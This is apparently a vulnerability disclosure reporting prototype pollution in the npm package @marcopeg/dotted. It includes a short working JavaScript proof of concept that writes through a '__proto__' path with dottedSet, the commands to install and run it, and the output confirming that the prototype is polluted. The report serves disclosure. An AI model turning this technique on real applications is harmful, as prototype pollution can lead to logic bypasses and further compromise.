# Description

`@marcopeg/dotted` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var {dottedSet} = require("@marcopeg/dotted/lib/dotted.set")
var obj = {}
console.log("Before : " + {}.polluted);
dottedSet(obj, '__proto__.polluted', 'Yes! Its Polluted');
console.log("After : " + {}.polluted);
```


2. Execute the following commands in terminal:

```
npm i @marcopeg/dotted # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
